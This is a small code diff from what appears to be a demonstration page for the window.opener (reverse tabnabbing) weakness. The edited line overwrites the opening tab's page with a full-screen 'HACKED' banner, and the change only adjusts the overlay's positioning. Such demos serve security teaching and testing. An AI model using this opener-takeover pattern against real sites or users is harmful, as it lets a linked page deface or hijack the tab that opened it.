@@ -131,7 +131,7 @@
                 const hackResultContainer = document.createElement('div');
                 hackResultContainer.classList = 'parent-hacked-container';
                 try {
-                    window.opener.document.body.innerHTML = '<div style="position: fixed; background: #cc0000; height: 100%; width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;color: white;"><h1>HACKED</h1><img src="https://media.giphy.com/media/PPi5c8l8WDY7if1L8z/giphy.gif"></div>';                    
+                    window.opener.document.body.innerHTML = '<div style="position: fixed; top:0; left:0;  background: #cc0000; height: 100%; width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;color: white;"><h1>HACKED</h1><img src="https://media.giphy.com/media/PPi5c8l8WDY7if1L8z/giphy.gif"></div>';                    
                 } catch (error) {
                     hackResultContainer.innerHTML = error;  
                     hackResultContainer.classList = 'error';
